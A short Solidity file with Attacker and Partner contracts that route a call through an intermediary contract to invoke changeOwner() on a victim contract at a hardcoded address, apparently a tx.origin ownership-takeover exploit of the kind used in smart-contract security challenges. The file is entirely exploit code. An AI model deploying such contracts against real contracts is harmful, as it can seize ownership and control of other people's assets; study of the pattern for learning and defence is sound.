// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Victim.sol';

contract Attacker {
  string public txorigin;
  string public msgowner;
  Partner public partner;
  

  constructor(address _partnerAddress) public { 
      partner = Partner(_partnerAddress);
  }

  function attack() public {
    partner.attack();
  }

}
contract Partner{
  Victim public victim;

  constructor(address _victimAddress) public {
    victim = Victim(0x6552Da115Ca3859b3a27764Ac3bE2074085Cd0F8);
  }

  function attack() public {
    victim.changeOwner();
  }
}